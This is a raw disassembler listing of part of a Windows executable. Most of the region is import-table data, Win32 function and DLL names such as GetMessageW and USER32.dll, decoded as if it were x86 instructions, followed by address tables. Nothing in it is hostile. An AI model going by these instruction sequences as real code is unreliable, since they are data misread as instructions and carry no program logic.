  428882:	je     0x4288d1
  428884:	gs jae 0x4288fa
  428887:	popa   
  428888:	addr16 gs push edi
  42888b:	add    BYTE PTR [ebx],ch
  42888d:	add    dl,BYTE PTR [ebx+0x65]
  428890:	outs   dx,BYTE PTR ds:[esi]
  428891:	fs dec ebp
  428893:	gs jae 0x428909
  428896:	popa   
  428897:	addr16 gs push edi
  42889a:	add    BYTE PTR [eax],al
  42889c:	das    
  42889d:	add    dl,BYTE PTR [ebx+0x65]
  4288a0:	je     0x4288e3
  4288a2:	arpl   WORD PTR [ecx+ebp*2+0x76],si
  4288a6:	gs push edi
  4288a8:	imul   ebp,DWORD PTR [esi+0x64],0x400776f
  4288af:	add    dl,BYTE PTR [edx+0x65]
  4288b2:	imul   esi,DWORD PTR [bp+di+0x74],0x6c437265
  4288ba:	popa   
  4288bb:	jae    0x428930
  4288bd:	inc    ebp
  4288be:	js     0x428917
  4288c0:	add    BYTE PTR [eax],al
  4288c2:	and    DWORD PTR [edx],eax
  4288c4:	push   ebx
  4288c5:	outs   dx,BYTE PTR gs:[esi]
  4288c7:	fs inc esp
  4288c9:	ins    BYTE PTR es:[edi],dx
  4288ca:	addr16 dec ecx
  4288cc:	je     0x428933
  4288ce:	ins    DWORD PTR es:[edi],dx
  4288cf:	dec    ebp
  4288d0:	gs jae 0x428946
  4288d3:	popa   
  4288d4:	addr16 gs inc ecx
  4288d7:	add    BYTE PTR ds:0x74654701,bh
  4288dd:	dec    ebp
  4288de:	gs jae 0x428954
  4288e1:	popa   
  4288e2:	addr16 gs push esp
  4288e5:	imul   ebp,DWORD PTR [ebp+0x65],0x1d0000
  4288ec:	inc    ebx
  4288ed:	popa   
  4288ee:	jae    0x428953
  4288f0:	popa   
  4288f1:	fs gs push edi
  4288f4:	imul   ebp,DWORD PTR [esi+0x64],0x73776f
  4288fb:	add    bh,bl
  4288fd:	add    BYTE PTR [ebp+0x78],al
  428900:	imul   esi,DWORD PTR [edi+edx*2+0x69],0x776f646e
  428908:	jae    0x42894f
  42890a:	js     0x42890c
  42890c:	repnz add DWORD PTR [eax+0x6f],edx
  428910:	jae    0x428986
  428912:	dec    ebp
  428913:	gs jae 0x428989
  428916:	popa   
  428917:	addr16 gs push edi
  42891a:	add    BYTE PTR [eax],al
  42891c:	add    DWORD PTR fs:[edi+0x65],eax
  428920:	je     0x428977
  428922:	jo     0x428988
  428924:	popa   
  428925:	je     0x42898c
  428927:	push   edx
  428928:	outs   dx,BYTE PTR ds:[si]
  42892a:	add    BYTE PTR [eax],al
  42892c:	mov    BYTE PTR [edx],al
  42892e:	push   esp
  42892f:	popa   
  428930:	bound  esp,QWORD PTR [edx+0x65]
  428933:	fs push esp
  428935:	gs js  0x4289ac
  428938:	dec    edi
  428939:	jne    0x4289af
  42893b:	push   edi
  42893c:	add    BYTE PTR [eax],al
  42893e:	test   eax,0x616f4c01
  428943:	fs inc edx
  428945:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0xb8004170
  42894d:	add    BYTE PTR [edx+esi*2+0x61],al
  428951:	ja     0x4289a6
  428953:	je     0x4289b6
  428955:	je     0x4289bc
  428957:	push   edi
  428958:	add    BYTE PTR [eax],al
  42895a:	ja     0x42895d
  42895c:	inc    edi
  42895d:	gs je  0x4289b7
  428960:	imul   ebp,DWORD PTR [esi+0x64],0x6554776f
  428967:	js     0x4289dd
  428969:	dec    esp
  42896a:	outs   dx,BYTE PTR gs:[esi]
  42896c:	addr16 je 0x4289d7
  42896f:	push   edi
  428970:	add    BYTE PTR [eax],al
  428972:	cmp    BYTE PTR [eax],al
  428974:	inc    ebx
  428975:	push   0x70557261
  42897a:	jo     0x4289e1
  42897c:	jb     0x4289c0
  42897e:	jne    0x4289e6
  428980:	push   di
  428982:	add    BYTE PTR [eax],al
  428984:	daa    
  428985:	add    DWORD PTR [edi+0x65],eax
  428988:	je     0x4289d5
  42898a:	gs jns 0x4289ef
  42898d:	outs   dx,DWORD PTR ds:[esi]
  42898e:	popa   
  42898f:	jb     0x4289f5
  428991:	push   esp
  428992:	jns    0x428a04
  428994:	add    BYTE PTR gs:[ebx+0x1],cl
  428998:	inc    edi
  428999:	gs je  0x4289ec
  42899c:	jb     0x428a0d
  42899e:	jo     0x4289f7
  4289a0:	add    BYTE PTR [eax],al
  4289a2:	dec    ebp
  4289a3:	add    BYTE PTR [ebx+0x6f],al
  4289a6:	jo     0x428a21
  4289a8:	push   edx
  4289a9:	arpl   WORD PTR gs:[eax+eax*1+0x0],si
  4289ae:	sub    eax,0x61684300
  4289b3:	jb     0x428a03
  4289b5:	gs js  0x428a2c
  4289b8:	push   edi
  4289b9:	add    BYTE PTR [eax+0x43734901],dl
  4289bf:	push   0x6f4c7261
  4289c4:	ja     0x428a2b
  4289c6:	jb     0x428a09
  4289c8:	add    BYTE PTR [eax],al
  4289ca:	sub    BYTE PTR [ecx],al
  4289cc:	inc    edi
  4289cd:	gs je  0x428a1c
  4289d0:	popa   
  4289d1:	jae    0x428a47
  4289d3:	inc    ecx
  4289d4:	arpl   WORD PTR [ecx+ebp*2+0x76],si
  4289d8:	gs push eax
  4289da:	outs   dx,DWORD PTR ds:[esi]
  4289db:	jo     0x428a52
  4289dd:	jo     0x4289df
  4289df:	add    BYTE PTR [ebx+0x616f4c01],bh
  4289e5:	fs push ebx
  4289e7:	je     0x428a5b
  4289e9:	imul   ebp,DWORD PTR [esi+0x67],0x16d0041
  4289f0:	inc    edi
  4289f1:	gs je  0x428a4b
  4289f4:	imul   ebp,DWORD PTR [esi+0x64],0x6f4c776f
  4289fb:	outs   dx,BYTE PTR ds:[esi]
  4289fc:	addr16 push edi
  4289fe:	add    BYTE PTR [eax],al
  428a00:	leave  
  428a01:	add    DWORD PTR [ebp+0x61],ecx
  428a04:	jo     0x428a5d
  428a06:	imul   ebp,DWORD PTR [esi+0x64],0x6f50776f
  428a0d:	imul   ebp,DWORD PTR [esi+0x74],0x350073
  428a14:	inc    ebx
  428a15:	push   0x6f547261
  428a1a:	dec    edi
  428a1b:	gs ins DWORD PTR es:[edi],dx
  428a1d:	push   edi
  428a1e:	add    BYTE PTR [eax],al
  428a20:	push   ebp
  428a21:	push   ebx
  428a22:	inc    ebp
  428a23:	push   edx
  428a24:	xor    esi,DWORD PTR [edx]
  428a26:	cs fs ins BYTE PTR es:[edi],dx
  428a29:	ins    BYTE PTR es:[edi],dx
  428a2a:	add    BYTE PTR [eax],al
  428a2c:	xchg   edx,eax
  428a2d:	add    edx,DWORD PTR [edx+0x74]
  428a30:	ins    BYTE PTR es:[edi],dx
  428a31:	dec    ecx
  428a32:	outs   dx,BYTE PTR ds:[esi]
  428a33:	imul   esi,DWORD PTR [ecx+eax*2+0x6e],0x74536973
  428a3b:	jb     0x428aa6
  428a3d:	outs   dx,BYTE PTR ds:[esi]
  428a3e:	add    BYTE PTR [bp+0x74],ch
  428a42:	fs ins BYTE PTR es:[edi],dx
  428a44:	ins    BYTE PTR es:[edi],dx
  428a45:	cs fs ins BYTE PTR es:[edi],dx
  428a48:	ins    BYTE PTR es:[edi],dx
  428a49:	add    BYTE PTR ds:0x74654702,al
  428a4f:	dec    esp
  428a50:	outs   dx,DWORD PTR ds:[esi]
  428a51:	arpl   WORD PTR [ecx+0x6c],sp
  428a54:	gs dec ecx
  428a56:	outs   dx,BYTE PTR ds:[esi]
  428a57:	outs   dx,WORD PTR ds:[esi]
  428a59:	push   edi
  428a5a:	add    BYTE PTR [eax],al
  428a5c:	inc    ebp
  428a5d:	add    al,BYTE PTR [edi+0x65]
  428a60:	je     0x428ab2
  428a62:	jb     0x428ad3
  428a64:	arpl   WORD PTR [ecx+0x64],ax
  428a67:	fs jb  0x428acf
  428a6a:	jae    0x428adf
  428a6c:	add    BYTE PTR [eax],al
  428a6e:	rol    DWORD PTR [eax],cl
  428a70:	inc    ebx
  428a71:	jb     0x428ad8
  428a73:	popa   
  428a74:	je     0x428adb
  428a76:	inc    esi
  428a77:	imul   ebp,DWORD PTR [ebp+eiz*2+0x4d],0x69707061
  428a7f:	outs   dx,BYTE PTR ds:[esi]
  428a80:	addr16 push edi
  428a82:	add    BYTE PTR [eax],al
  428a84:	sub    BYTE PTR [ebx+edx*2],al
  428a87:	gs je  0x428ad2
  428a8a:	popa   
  428a8b:	outs   dx,BYTE PTR ds:[esi]
  428a8c:	fs ins BYTE PTR es:[edi],dx
  428a8e:	gs inc ebx
  428a90:	outs   dx,DWORD PTR ds:[esi]
  428a91:	jne    0x428b01
  428a93:	je     0x428a95
  428a95:	add    ah,bl
  428a97:	add    BYTE PTR [ebx+0x72],al
  428a9a:	gs popa 
  428a9c:	je     0x428b03
  428a9e:	dec    ebp
  428a9f:	popa   
  428aa0:	imul   ebp,DWORD PTR [ebx+esi*2+0x6c],0x57746f
  428aa8:	pop    DWORD PTR [ecx]
  428aaa:	inc    edi
  428aab:	gs je  0x428aef
  428aae:	je     0x428b1f
  428ab0:	ins    DWORD PTR es:[edi],dx
  428ab1:	dec    esi
  428ab2:	popa   
  428ab3:	ins    DWORD PTR es:[edi],dx
  428ab4:	gs inc ecx
  428ab6:	add    BYTE PTR [eax],al
  428ab8:	pusha  
  428ab9:	add    al,BYTE PTR [edi+0x65]
  428abc:	je     0x428b11
  428abe:	jns    0x428b33
  428ac0:	je     0x428b27
  428ac2:	ins    DWORD PTR es:[edi],dx
  428ac3:	push   edi
  428ac4:	imul   ebp,DWORD PTR [esi+0x64],0x4473776f
  428acb:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  428ad2:	jns    0x428b15
  428ad4:	add    BYTE PTR [eax],al
  428ad6:	aas    
  428ad7:	add    ecx,DWORD PTR [edi+ebp*2+0x61]
  428adb:	fs dec esp
  428add:	imul   esp,DWORD PTR [edx+0x72],0x57797261
  428ae4:	add    BYTE PTR [eax],al
  428ae6:	xchg   ecx,eax
  428ae7:	add    al,BYTE PTR [edi+0x6c]
  428aea:	outs   dx,DWORD PTR ds:[esi]
  428aeb:	bound  esp,QWORD PTR [ecx+0x6c]
  428aee:	inc    ecx
  428aef:	ins    BYTE PTR es:[edi],dx
  428af0:	ins    BYTE PTR es:[edi],dx
  428af1:	outs   dx,DWORD PTR ds:[esi]
  428af2:	arpl   WORD PTR [eax],ax
  428af4:	xchg   edx,eax
  428af5:	add    al,0x56
  428af7:	imul   esi,DWORD PTR [edx+0x74],0x516c6175
  428afe:	jne    0x428b65
  428b00:	jb     0x428b7b
  428b02:	add    BYTE PTR [eax],al
  428b04:	test   DWORD PTR [ecx],0x46746547
  428b0a:	imul   ebp,DWORD PTR [ebp+eiz*2+0x54],0x657079
  428b12:	jb     0x428b15
  428b14:	inc    esi
  428b15:	imul   ebp,DWORD PTR [esi+0x64],0x6f736552
  428b1c:	jne    0x428b90
  428b1e:	arpl   WORD PTR [ebp+0x57],sp
  428b21:	add    BYTE PTR [eax],bh
  428b23:	add    ecx,DWORD PTR [ebp+0x6f]
  428b26:	jbe    0x428b8d
  428b28:	inc    esi
  428b29:	imul   ebp,DWORD PTR [ebp+eiz*2+0x57],0x52037600
  428b31:	popa   
  428b32:	imul   esi,DWORD PTR [ebx+0x65],0x65637845
  428b39:	jo     0x428baf
  428b3b:	imul   ebp,DWORD PTR [edi+0x6e],0x1920000
  428b42:	inc    edi
  428b43:	gs je  0x428b88
  428b46:	imul   ebp,DWORD PTR [esi+0x61],0x79547972
  428b4d:	jo     0x428bb4
  428b4f:	inc    ecx
  428b50:	add    BYTE PTR [eax],al
  428b52:	and    DWORD PTR [ebx+edx*2],eax
  428b55:	gs je  0x428b9e
  428b58:	imul   ebp,DWORD PTR [ebp+eiz*2+0x41],0x69727474
  428b60:	bound  esi,QWORD PTR [ebp+0x74]
  428b63:	gs jae 0x428ba7
  428b66:	add    BYTE PTR [eax],al
  428b68:	add    ecx,DWORD PTR ss:[ebp+0x6f]
  428b6c:	jbe    0x428bd3
  428b6e:	inc    esi
  428b6f:	imul   ebp,DWORD PTR [ebp+eiz*2+0x45],0xbf004178
  428b77:	add    BYTE PTR [ebx+0x6f],al
  428b7a:	jo     0x428bf5
  428b7c:	inc    esi
  428b7d:	imul   ebp,DWORD PTR [ebp+eiz*2+0x41],0x51037100
  428b85:	jne    0x428bec
  428b87:	jb     0x428c02
  428b89:	push   eax
  428b8a:	gs jb  0x428bf3
  428b8d:	outs   dx,DWORD PTR ds:[esi]
  428b8e:	jb     0x428bfd
  428b90:	popa   
  428b91:	outs   dx,BYTE PTR ds:[esi]
  428b92:	arpl   WORD PTR [ebp+0x43],sp
  428b95:	outs   dx,DWORD PTR ds:[esi]
  428b96:	jne    0x428c06
  428b98:	je     0x428bff
  428b9a:	jb     0x428b9c
  428b9c:	sub    DWORD PTR [ebx+edx*2],eax
  428b9f:	gs je  0x428bea
  428ba2:	popa   
  428ba3:	outs   dx,BYTE PTR ds:[esi]
  428ba4:	fs ins BYTE PTR es:[edi],dx
  428ba6:	gs dec ecx
  428ba8:	outs   dx,BYTE PTR ds:[esi]
  428ba9:	outs   dx,WORD PTR ds:[esi]
  428bab:	jb     0x428c1a
  428bad:	popa   
  428bae:	je     0x428c19
  428bb0:	outs   dx,DWORD PTR ds:[esi]
  428bb1:	outs   dx,BYTE PTR ds:[esi]
  428bb2:	add    BYTE PTR [eax],al
  428bb4:	push   ss
  428bb5:	add    DWORD PTR [ebp+0x6e],eax
  428bb8:	je     0x428c1f
  428bba:	jb     0x428bff
  428bbc:	jb     0x428c27
  428bbe:	je     0x428c29
  428bc0:	arpl   WORD PTR [ecx+0x6c],sp
  428bc3:	push   ebx
  428bc4:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  428bc9:	outs   dx,BYTE PTR ds:[esi]
  428bca:	add    BYTE PTR [eax],al
  428bcc:	jg     0x428bcf
  428bce:	inc    esi
  428bcf:	outs   dx,DWORD PTR ds:[esi]
  428bd0:	ins    BYTE PTR es:[edi],dx
  428bd1:	fs push ebx
  428bd3:	je     0x428c47
  428bd5:	imul   ebp,DWORD PTR [esi+0x67],0x4dd0057
  428bdc:	ins    BYTE PTR es:[edi],dx
  428bdd:	jae    0x428c53
  428bdf:	jb     0x428c4d
  428be1:	outs   dx,BYTE PTR gs:[esi]
  428be3:	inc    ecx
  428be4:	add    BYTE PTR [eax],al
  428be6:	sahf   
  428be7:	add    DWORD PTR [edi+0x65],eax
  428bea:	je     0x428c2f
  428bec:	outs   dx,DWORD PTR ds:[esi]
  428bed:	ins    DWORD PTR es:[edi],dx
  428bee:	ins    DWORD PTR es:[edi],dx
  428bef:	push   esp
  428bf0:	imul   ebp,DWORD PTR [ebp+0x65],0x7374756f
  428bf7:	add    BYTE PTR [edx+eax*1+0x47],dh
  428bfb:	gs je  0x428c52
  428bfe:	push   0x64616572
  428c03:	push   esp
  428c04:	imul   ebp,DWORD PTR [ebp+0x65],0x4b000073
  428c0b:	inc    ebp
  428c0c:	push   edx
  428c0d:	dec    esi
  428c0e:	inc    ebp
  428c0f:	dec    esp
  428c10:	xor    esi,DWORD PTR [edx]
  428c12:	cs fs ins BYTE PTR es:[edi],dx
  428c15:	ins    BYTE PTR es:[edi],dx
  428c16:	add    BYTE PTR [eax],al
  428c18:	mov    dh,0x1
  428c1a:	push   eax
  428c1b:	outs   dx,DWORD PTR ds:[esi]
  428c1c:	ins    BYTE PTR es:[edi],dx
  428c1d:	jns    0x428c86
  428c1f:	outs   dx,DWORD PTR ds:[esi]
  428c20:	outs   dx,BYTE PTR ds:[esi]
  428c21:	add    BYTE PTR [ecx+eax*1+0x47],ch
  428c25:	gs je  0x428c77
  428c28:	bound  ebp,QWORD PTR [edx+0x65]
  428c2b:	arpl   WORD PTR [edi+edx*2+0x0],si
  428c2f:	add    BYTE PTR [ebx+0x6c654400],dh
  428c35:	gs je  0x428c9d
  428c38:	inc    esp
  428c39:	inc    ebx
  428c3a:	add    BYTE PTR [eax],al
  428c3c:	rol    DWORD PTR [ecx],1
  428c3e:	push   ebx
  428c3f:	gs ins BYTE PTR es:[edi],dx
  428c41:	arpl   WORD PTR gs:[edi+ecx*2+0x62],si
  428c46:	push   0x65
  428c48:	arpl   WORD PTR [eax+eax*1+0x0],si
  428c4c:	jmp    0x428c4f
  428c4e:	push   ebx
  428c4f:	gs je  0x428c9f
  428c52:	popa   
  428c53:	jo     0x428ca2
  428c55:	outs   dx,DWORD PTR ds:[esi]
  428c56:	fs add BYTE PTR gs:[eax],al
  428c5a:	leave  
  428c5b:	add    DWORD PTR [edx+0x6f],edx
  428c5e:	jne    0x428cce
  428c60:	fs push edx
  428c62:	arpl   WORD PTR gs:[eax+eax*1+0x76],si
  428c67:	add    BYTE PTR [edx+0x69],al
  428c6a:	je     0x428cae
  428c6c:	ins    BYTE PTR es:[edi],dx
  428c6d:	je     0x428c6f
  428c6f:	add    BYTE PTR [ebx+0x61655201],bh
  428c75:	ins    BYTE PTR es:[edi],dx
  428c76:	imul   edi,DWORD PTR [edx+0x65],0x656c6150
  428c7d:	je     0x428cf3
  428c7f:	add    BYTE PTR gs:[eax],al
  428c82:	jge    0x428c85
  428c84:	inc    edi
  428c85:	gs je  0x428cdb
  428c88:	jns    0x428cfd
  428c8a:	je     0x428cf1
  428c8c:	ins    DWORD PTR es:[edi],dx
  428c8d:	push   eax
  428c8e:	popa   
  428c8f:	ins    BYTE PTR es:[edi],dx
  428c90:	gs je  0x428d07
  428c93:	gs push ebp
  428c95:	jae    0x428cfc
  428c97:	add    BYTE PTR [eax+0x74654701],cl
  428c9d:	push   esp
  428c9e:	gs js  0x428d15
  428ca1:	inc    ebp
  428ca2:	js     0x428d18
  428ca4:	outs   dx,BYTE PTR gs:[esi]
  428ca6:	je     0x428cf8
  428ca8:	outs   dx,DWORD PTR ds:[esi]
  428ca9:	imul   ebp,DWORD PTR [esi+0x74],0x1cb0041
  428cb0:	push   ebx
  428cb1:	arpl   WORD PTR [ecx+0x6c],sp
  428cb4:	gs push esi
  428cb6:	imul   esp,DWORD PTR [ebp+0x77],0x74726f70
  428cbd:	inc    ebp
  428cbe:	js     0x428d34
  428cc0:	inc    ebp
  428cc1:	js     0x428cc3
  428cc3:	add    bh,cl
  428cc5:	add    DWORD PTR [ebx+0x65],edx
  428cc8:	ins    BYTE PTR es:[edi],dx
  428cc9:	arpl   WORD PTR gs:[ebx+eax*2+0x6c],si
  428cce:	imul   esi,DWORD PTR [eax+0x52],0xfd006e67
  428cd5:	add    DWORD PTR [ebx+0x65],edx
  428cd8:	je     0x428d2e
  428cda:	gs js  0x428d51
  428cdd:	inc    ebx
  428cde:	outs   dx,DWORD PTR ds:[esi]
  428cdf:	ins    BYTE PTR es:[edi],dx
  428ce0:	outs   dx,DWORD PTR ds:[esi]
  428ce1:	jb     0x428ce3
  428ce3:	add    BYTE PTR [eax+0x74615001],ch
  428ce9:	push   0x65526f54
  428cee:	imul   ebp,DWORD PTR [bx+0x6e],0x810000
  428cf6:	inc    ebx
  428cf7:	outs   dx,DWORD PTR ds:[esi]
  428cf8:	ins    DWORD PTR es:[edi],dx
  428cf9:	bound  ebp,QWORD PTR [ecx+0x6e]
  428cfc:	gs push edx
  428cfe:	outs   dx,BYTE PTR ds:[si]
  428d00:	add    BYTE PTR [eax],al
  428d02:	lods   al,BYTE PTR ds:[esi]
  428d03:	add    BYTE PTR [ebx+0x72],al
  428d06:	gs popa 
  428d08:	je     0x428d6f
  428d0a:	push   edx
  428d0b:	arpl   WORD PTR gs:[edx+edx*2+0x67],si
  428d10:	outs   dx,BYTE PTR ds:[esi]
  428d11:	dec    ecx
  428d12:	outs   dx,BYTE PTR ds:[esi]
  428d13:	imul   esi,DWORD PTR fs:[edx+0x65],0x9a007463
  428d1b:	add    DWORD PTR [ecx+ebp*2+0x6e],ecx
  428d1f:	gs push esp
  428d21:	outs   dx,DWORD PTR ds:[esi]
  428d22:	add    BYTE PTR [eax],al
  428d24:	mov    ds:0x65724300,al
  428d29:	popa   
  428d2a:	je     0x428d91
  428d2c:	dec    ecx
  428d2d:	inc    ebx
  428d2e:	push   edi
  428d2f:	add    BYTE PTR [ebp+0x63655201],bh
  428d35:	je     0x428d8d
  428d37:	imul   esi,DWORD PTR [ebx+0x69],0x656c62
  428d3e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428d3f:	add    BYTE PTR [ebx+0x72],al
  428d42:	gs popa 
  428d44:	je     0x428dab
  428d46:	push   eax
  428d47:	popa   
  428d48:	ins    BYTE PTR es:[edi],dx
  428d49:	gs je  0x428dc0
  428d4c:	add    BYTE PTR gs:[edi+0x44],al
  428d50:	dec    ecx
  428d51:	xor    esi,DWORD PTR [edx]
  428d53:	cs fs ins BYTE PTR es:[edi],dx
  428d56:	ins    BYTE PTR es:[edi],dx
	...
  428d5f:	add    BYTE PTR [eax+eiz*1+0x2],ah
	...
  428d7e:	add    BYTE PTR [eax],al
  428d80:	fwait
  428d81:	lea    eax,[edx]
	...
  428d8f:	add    BYTE PTR [ecx+0x64],ch
  428d92:	js     0x428dfd
  428d94:	outs   dx,DWORD PTR fs:[esi]
  428d96:	arpl   WORD PTR cs:[edi+0x6d],bp
  428d9a:	add    BYTE PTR [ebx+0x65],dl
  428d9d:	je     0x428de0
  428d9f:	outs   dx,BYTE PTR ds:[esi]
  428da0:	arpl   WORD PTR [eax+0x6f],bp
  428da3:	jb     0x428df4
  428da5:	jb     0x428e10
  428da7:	imul   ebp,DWORD PTR [bp+0x61],0x3231406c
  428daf:	add    BYTE PTR [eax],al
  428db1:	add    BYTE PTR [eax],al
  428db3:	add    BYTE PTR [eax],ch
  428db5:	xchg   BYTE PTR [edx],al
  428db7:	add    BYTE PTR [esi+eax*4+0x2],al
  428dbb:	add    BYTE PTR [esi-0x7a],dl
  428dbe:	add    al,BYTE PTR [eax]
  428dc0:	push   0x80000286
  428dc5:	xchg   BYTE PTR [edx],al
  428dc7:	add    BYTE PTR [esi+eax*4-0x7951fffe],dl
  428dce:	add    al,BYTE PTR [eax]
  428dd0:	add    BYTE PTR [eax],al
  428dd2:	add    BYTE PTR [eax],al
  428dd4:	rol    BYTE PTR [esi-0x7911fffe],1
  428dda:	add    al,BYTE PTR [eax]
  428ddc:	cld    
  428ddd:	xchg   BYTE PTR [edx],al
  428ddf:	add    BYTE PTR [edx],cl
  428de1:	xchg   DWORD PTR [edx],eax
  428de3:	add    BYTE PTR [esi],bl
  428de5:	xchg   DWORD PTR [edx],eax
  428de7:	add    BYTE PTR [edi+eax*4],ch
  428dea:	add    al,BYTE PTR [eax]
  428dec:	xchg   DWORD PTR ds:[edx],eax
  428def:	add    BYTE PTR [eax-0x79],dl
  428df2:	add    al,BYTE PTR [eax]
  428df4:	pop    esi
  428df5:	xchg   DWORD PTR [edx],eax
  428df7:	add    BYTE PTR [eax-0x79],dh
  428dfa:	add    al,BYTE PTR [eax]
  428dfc:	add    BYTE PTR [edi-0x786ffffe],0x2
  428e03:	add    BYTE PTR [esi-0x4ffffd79],bl
  428e09:	xchg   DWORD PTR [edx],eax
  428e0b:	add    BYTE PTR [edi+eax*4-0x782dfffe],bh
  428e12:	add    al,BYTE PTR [eax]
  428e14:	in     al,0x87
  428e16:	add    al,BYTE PTR [eax]
  428e18:	test   BYTE PTR [edi-0x77fdfffe],0x2
  428e1f:	add    BYTE PTR [edx],dl
  428e21:	mov    BYTE PTR [edx],al
  428e23:	add    BYTE PTR [edx],ah
  428e25:	mov    BYTE PTR [edx],al
  428e27:	add    BYTE PTR [eax],bh
  428e29:	mov    BYTE PTR [edx],al
  428e2b:	add    BYTE PTR [eax+ecx*4+0x2],al
  428e2f:	add    BYTE PTR [esi-0x78],dl
  428e32:	add    al,BYTE PTR [eax]
  428e34:	ins    BYTE PTR es:[edi],dx
  428e35:	mov    BYTE PTR [edx],al
  428e37:	add    BYTE PTR [esi-0x78],bh
  428e3a:	add    al,BYTE PTR [eax]
  428e3c:	mov    WORD PTR [eax-0x7763fffe],cs
  428e42:	add    al,BYTE PTR [eax]
  428e44:	scas   al,BYTE PTR es:[edi]
  428e45:	mov    BYTE PTR [edx],al
  428e47:	add    dl,al
  428e49:	mov    BYTE PTR [edx],al
  428e4b:	add    al,bl
  428e4d:	mov    BYTE PTR [edx],al
  428e4f:	add    dl,ch
  428e51:	mov    BYTE PTR [edx],al
  428e53:	add    ah,bh
  428e55:	mov    BYTE PTR [edx],al
  428e57:	add    BYTE PTR [ecx+ecx*4],cl
  428e5a:	add    al,BYTE PTR [eax]
  428e5c:	sbb    al,0x89
  428e5e:	add    al,BYTE PTR [eax]
  428e60:	sub    al,0x89
  428e62:	add    al,BYTE PTR [eax]
  428e64:	mov    DWORD PTR ds:[edx],eax
  428e67:	add    BYTE PTR [ecx+ecx*4+0x2],cl
  428e6b:	add    BYTE PTR [edx-0x77],bl
  428e6e:	add    al,BYTE PTR [eax]
  428e70:	jb     0x428dfb
  428e72:	add    al,BYTE PTR [eax]
  428e74:	test   BYTE PTR [ecx-0x7669fffe],cl
  428e7a:	add    al,BYTE PTR [eax]
  428e7c:	mov    ds:0xae000289,al
  428e81:	mov    DWORD PTR [edx],eax
  428e83:	add    BYTE PTR [edx-0x35fffd77],bh
  428e89:	mov    DWORD PTR [edx],eax
  428e8b:	add    al,ah
  428e8d:	mov    DWORD PTR [edx],eax
  428e8f:	add    dh,ch
  428e91:	mov    DWORD PTR [edx],eax
  428e93:	add    BYTE PTR [eax],al
  428e95:	mov    al,BYTE PTR [edx]
  428e97:	add    BYTE PTR [edx],dl
  428e99:	mov    al,BYTE PTR [edx]
  428e9b:	add    BYTE PTR [eax],al
  428e9d:	add    BYTE PTR [eax],al
  428e9f:	add    BYTE PTR [edx+ecx*4],ch
  428ea2:	add    al,BYTE PTR [eax]
  428ea4:	add    BYTE PTR [eax],al
  428ea6:	add    BYTE PTR [eax],al
  428ea8:	dec    edx
  428ea9:	mov    al,BYTE PTR [edx]
  428eab:	add    BYTE PTR [edx+ecx*4+0x2],bl
  428eaf:	add    BYTE PTR [esi-0x76],ch
  428eb2:	add    al,BYTE PTR [eax]
  428eb4:	test   BYTE PTR [edx-0x7569fffe],cl
  428eba:	add    al,BYTE PTR [eax]
  428ebc:	test   al,0x8a
  428ebe:	add    al,BYTE PTR [eax]
  428ec0:	mov    eax,0xd600028a
  428ec5:	mov    al,BYTE PTR [edx]
  428ec7:	add    dh,ah
  428ec9:	mov    al,BYTE PTR [edx]
  428ecb:	add    ah,dh
  428ecd:	mov    al,BYTE PTR [edx]
  428ecf:	add    BYTE PTR [ebx+ecx*4],al
  428ed2:	add    al,BYTE PTR [eax]
  428ed4:	adc    cl,BYTE PTR [ebx-0x74ddfffe]
  428eda:	add    al,BYTE PTR [eax]
  428edc:	mov    eax,DWORD PTR cs:[edx]
  428edf:	add    BYTE PTR [eax-0x75],al
  428ee2:	add    al,BYTE PTR [eax]
  428ee4:	push   edx
  428ee5:	mov    eax,DWORD PTR [edx]
  428ee7:	add    BYTE PTR [eax-0x75],ch
  428eea:	add    al,BYTE PTR [eax]
  428eec:	jbe    0x428e79
  428eee:	add    al,BYTE PTR [eax]
  428ef0:	or     BYTE PTR [ebx-0x7463fffe],0x2
  428ef7:	add    BYTE PTR [ebx+ecx*4-0x7433fffe],dh
  428efe:	add    al,BYTE PTR [eax]
  428f00:	fimul  DWORD PTR [ebx-0x7419fffe]
  428f06:	add    al,BYTE PTR [eax]
  428f08:	clc    
  428f09:	mov    eax,DWORD PTR [edx]
  428f0b:	add    BYTE PTR [eax],al
  428f0d:	add    BYTE PTR [eax],al
  428f0f:	add    BYTE PTR [eax],bl
  428f11:	mov    WORD PTR [edx],es
  428f13:	add    BYTE PTR [edx],ah
  428f15:	mov    WORD PTR [edx],es
  428f17:	add    BYTE PTR [eax],dh
  428f19:	mov    WORD PTR [edx],es
  428f1b:	add    BYTE PTR [esp+ecx*4],bh
  428f1e:	add    al,BYTE PTR [eax]
  428f20:	dec    esp
  428f21:	mov    WORD PTR [edx],es
  428f23:	add    BYTE PTR [edx-0x74],bl
  428f26:	add    al,BYTE PTR [eax]
  428f28:	data16 mov WORD PTR [edx],es
  428f2b:	add    BYTE PTR [eax-0x74],dh
  428f2e:	add    al,BYTE PTR [eax]
  428f30:	or     BYTE PTR [edx+eax*1+0x28c9800],0x0
  428f38:	scas   al,BYTE PTR es:[edi]
  428f39:	mov    WORD PTR [edx],es
  428f3b:	add    ah,al
  428f3d:	mov    WORD PTR [edx],es
  428f3f:	add    ah,dl
  428f41:	mov    WORD PTR [edx],es
  428f43:	add    ah,ah
  428f45:	mov    WORD PTR [edx],es
  428f47:	add    ah,dh
  428f49:	mov    WORD PTR [edx],es
  428f4b:	add    BYTE PTR [edx],al
  428f4d:	lea    eax,[edx]
  428f4f:	add    BYTE PTR [edx],bl
  428f51:	lea    eax,[edx]
  428f53:	add    BYTE PTR [ecx*4-0x72cffffe],ah
  428f5a:	add    al,BYTE PTR [eax]
  428f5c:	lea    eax,ds:[edx]
  428f5f:	add    BYTE PTR [eax],al
  428f61:	add    BYTE PTR [eax],al
	...
